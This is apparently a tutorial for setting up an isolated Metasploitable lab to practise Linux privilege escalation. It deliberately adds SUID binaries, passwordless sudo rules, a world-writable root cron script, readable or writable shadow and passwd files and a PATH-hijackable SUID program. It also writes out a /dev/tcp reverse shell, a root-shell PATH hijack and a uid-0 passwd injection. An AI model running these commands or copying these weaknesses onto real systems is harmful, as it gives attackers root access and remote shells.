# 🛠️ Linux Privilege Escalation — Lab Setup Guide

> **Goal**: Set up your Metasploitable 2 VM with intentional vulnerabilities so you can practice every PrivEsc technique from the main guide.

> **Your Lab**: Kali `192.168.56.10` ↔ Metasploitable `192.168.56.20`

---

## 📋 Prerequisites

| Item                              | Status         |
| --------------------------------- | -------------- |
| Kali VM running                   | ✅ Already done |
| Metasploitable 2 VM running       | ✅ Already done |
| Network connectivity (ping works) | ✅ Already done |
| SSH config fix for old key types  | ✅ Already done |

---

## Step 0: SSH Into Metasploitable

> Everything below is run **on Metasploitable** unless stated otherwise.

```bash
# From Kali — SSH into Metasploitable
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.20
# Password: msfadmin
```

> 💡 If you already added the SSH config earlier, just use:
> ```bash
> ssh msfadmin@192.168.56.20
> ```

---

## Step 1: Create a Low-Privilege Practice User

> You need a **non-root, low-privilege user** to practice escalating FROM.

```bash
# Run as msfadmin (who has sudo-like access on Metasploitable)
sudo adduser trainee
# Set password: trainee123
# Press Enter through all prompts (full name, etc.)
```

**Verify:**
```bash
su - trainee
whoami    # Should say: trainee
id        # Should show: uid=1001(trainee) gid=1001(trainee) groups=1001(trainee)
exit      # Go back to msfadmin
```

---

## Step 2: Set Up SUID Binary Exploitation

> Make some binaries SUID so `trainee` can exploit them.

```bash
# These create SUID vulnerabilities you can practice exploiting
sudo chmod u+s /usr/bin/find
sudo chmod u+s /usr/bin/vim
sudo chmod u+s /usr/bin/nmap
sudo chmod u+s /usr/bin/python
```

**Verify:**
```bash
find / -perm -4000 -type f 2>/dev/null
# Should include: /usr/bin/find, /usr/bin/vim, /usr/bin/nmap, /usr/bin/python
```

> 🎯 **Practice**: Login as `trainee`, find these SUID binaries, look them up on [GTFOBins](https://gtfobins.github.io/#+suid), and escalate to root!

---

## Step 3: Set Up Sudo Abuse Scenarios

> Give `trainee` specific sudo permissions to practice exploiting.

```bash
# Edit sudoers safely
sudo visudo
```

**Add this at the bottom of the file:**

```
# === PrivEsc Practice Entries ===
trainee ALL=(ALL) NOPASSWD: /usr/bin/vim
trainee ALL=(ALL) NOPASSWD: /usr/bin/find
trainee ALL=(ALL) NOPASSWD: /usr/bin/awk
trainee ALL=(ALL) NOPASSWD: /usr/bin/less
trainee ALL=(ALL) NOPASSWD: /usr/bin/man
trainee ALL=(ALL) NOPASSWD: /usr/bin/env
trainee ALL=(ALL) NOPASSWD: /usr/bin/perl
```

**Verify (as trainee):**
```bash
su - trainee
sudo -l
# Should show all the NOPASSWD entries above
```

> 🎯 **Practice**: Use each of these to get a root shell via GTFOBins sudo methods!

---

## Step 4: Set Up Cron Job Exploitation

> Create a root cron job that runs a writable script.

```bash
# Create a script that root will run via cron
sudo bash -c 'echo "#!/bin/bash" > /opt/cleanup.sh'
sudo bash -c 'echo "echo cleaned > /tmp/cleanup.log" >> /opt/cleanup.sh'
sudo chmod 777 /opt/cleanup.sh    # <-- Intentionally world-writable!

# Add it to root's crontab (runs every minute)
sudo bash -c 'echo "* * * * * root /opt/cleanup.sh" >> /etc/crontab'
```

**Verify:**
```bash
cat /etc/crontab         # Should show the cleanup.sh entry
ls -la /opt/cleanup.sh   # Should show -rwxrwxrwx (writable by everyone)
```

> 🎯 **Practice as trainee:**
> 1. Find the writable cron script
> 2. Inject a reverse shell: `echo 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1' >> /opt/cleanup.sh`
> 3. Listen on Kali: `nc -lvnp 4444`
> 4. Wait for the cron to execute — root shell!

---

## Step 5: Set Up Weak File Permissions

```bash
# Make /etc/shadow readable (normally only root can read)
sudo chmod o+r /etc/shadow

# Make a backup of passwd that's writable
sudo cp /etc/passwd /etc/passwd.bak
sudo chmod 666 /etc/passwd.bak
```

**Verify:**
```bash
su - trainee
cat /etc/shadow          # Should work (normally it wouldn't!)
ls -la /etc/passwd.bak   # Should be writable by everyone
```

> 🎯 **Practice**:
> - Copy shadow hashes → crack them with John the Ripper on Kali
> - Add a root user to `/etc/passwd.bak` to understand the technique

---

## Step 6: Set Up PATH Hijacking

```bash
# 1. Create a C program that calls 'service' without an absolute path
sudo bash -c 'cat > /tmp/suid_service.c << "EOF"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main() {
    // Set effective user ID to root
    setuid(0);
    setgid(0);
    printf("Starting service...\n");
    
    // The vulnerability: calling "service" without the full path
    system("service apache2 status");
    
    return 0;
}
EOF'

# 2. Compile the C program into a binary
sudo gcc /tmp/suid_service.c -o /usr/local/bin/suid_service

# 3. Add the SUID bit to the compiled binary
sudo chmod u+s /usr/local/bin/suid_service

# 4. Clean up the source code
sudo rm /tmp/suid_service.c
```

**Verify:**
```bash
ls -la /usr/local/bin/suid_service
# Should show SUID bit set (-rwsr-xr-x) and owner as root
```

> 🎯 **Practice as trainee:**
> 1. Create fake `service` in `/tmp/`: `echo '#!/bin/bash' > /tmp/service && echo '/bin/bash -p' >> /tmp/service && chmod +x /tmp/service`
> 2. Hijack PATH: `export PATH=/tmp:$PATH`
> 3. Run: `/usr/local/bin/suid_service`
> 4. Check: `whoami` → should be root!

---

## Step 7: Set Up Writable `/etc/passwd` (For Practice)

> ⚠️ This modifies a critical file. Only do this for practice.

```bash
# Make /etc/passwd writable by trainee
sudo chmod o+w /etc/passwd
```

**Verify:**
```bash
ls -la /etc/passwd   # Should show writable
```

> 🎯 **Practice as trainee:**
> ```bash
> # Generate a password hash
> openssl passwd -1 -salt hacker password123
> # Add a new root user
> echo 'hacker:$1$hacker$<paste_hash>:0:0::/root:/bin/bash' >> /etc/passwd
> su hacker   # Password: password123 → you're root!
> ```

---

## Step 8: Download Enumeration Tools to Kali

> Run these **on Kali** to prepare tools for transfer.

```bash
# Create a tools directory
mkdir -p ~/privesc_tools && cd ~/privesc_tools

# Download LinPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Download LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Download Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# Make them executable
chmod +x *.sh
```

### Transfer to Metasploitable

```bash
# Option 1: SCP (from Kali)
scp ~/privesc_tools/*.sh msfadmin@192.168.56.20:/tmp/

# Option 2: HTTP Server (from Kali)
cd ~/privesc_tools
python3 -m http.server 8080

# Then on Metasploitable:
wget http://192.168.56.10:8080/linpeas.sh -O /tmp/linpeas.sh
```

---

## Step 9: Check What Metasploitable Already Has

> Metasploitable 2 comes with **built-in vulnerabilities**. Check these:

```bash
# Already vulnerable services (no setup needed!)
# 1. MySQL running as root
mysql -u root          # No password needed!
\! bash                # Drops you to a root shell

# 2. NFS exports
cat /etc/exports       # Look for no_root_squash
showmount -e 192.168.56.20   # Run from Kali

# 3. Writable files
find / -writable -type f 2>/dev/null | head -20

# 4. Weak SSH keys
ls -la /root/.ssh/
```

---

## 🗺️ Practice Order (Recommended)

| #   | Technique             | Difficulty | Section                         |
| --- | --------------------- | ---------- | ------------------------------- |
| 1   | Manual Enumeration    | 🟢 Easy     | Run all commands from Section 2 |
| 2   | SUID Abuse            | 🟢 Easy     | Find SUID bins → GTFOBins       |
| 3   | Sudo Abuse            | 🟢 Easy     | `sudo -l` → GTFOBins            |
| 4   | Weak File Permissions | 🟡 Medium   | Read shadow, write passwd       |
| 5   | Cron Job Exploitation | 🟡 Medium   | Inject into cleanup.sh          |
| 6   | PATH Hijacking        | 🟡 Medium   | Fake binary in PATH             |
| 7   | Kernel Exploits       | 🔴 Hard     | Linux Exploit Suggester         |
| 8   | NFS Exploitation      | 🔴 Hard     | no_root_squash abuse            |
| 9   | Run LinPEAS & Analyze | 🟡 Medium   | Find what you missed            |

---

## 🔄 Reset Everything (Start Fresh)

If you want to reset all the changes and start over:

```bash
# Remove trainee user
sudo userdel -r trainee

# Remove SUID bits
sudo chmod u-s /usr/bin/find /usr/bin/vim /usr/bin/nmap /usr/bin/python

# Fix file permissions
sudo chmod o-r /etc/shadow
sudo chmod o-w /etc/passwd
sudo chmod 644 /etc/passwd.bak

# Remove cron entry
sudo sed -i '/cleanup.sh/d' /etc/crontab
sudo rm /opt/cleanup.sh

# Remove PATH hijack binary
sudo rm /usr/local/bin/suid_service

# Remove sudo entries (edit and remove the practice lines)
sudo visudo
```

---

> 🔙 **Back to**: [Linux PrivEsc Main Guide](./linux_privesc.md)
> 🔙 **Previous Phase**: [Phase 3 — File Transfer](../phase_3_file_transfer/file_transfer.md)
